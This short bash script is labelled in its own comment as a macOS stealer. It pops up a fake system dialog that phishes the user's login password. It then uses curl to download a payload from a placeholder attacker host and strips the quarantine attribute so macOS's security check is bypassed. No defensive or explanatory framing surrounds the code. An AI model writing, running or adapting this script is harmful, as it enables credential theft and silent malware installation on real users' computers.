#!/bin/bash
# macOS stealer: phish the login password via a fake dialog, then strip quarantine and run.
PW=$(osascript -e 'display dialog "App needs your password" default answer "" with hidden answer')
curl -fsSL https://evil.example/payload -o /tmp/payload
xattr -d com.apple.quarantine /tmp/payload
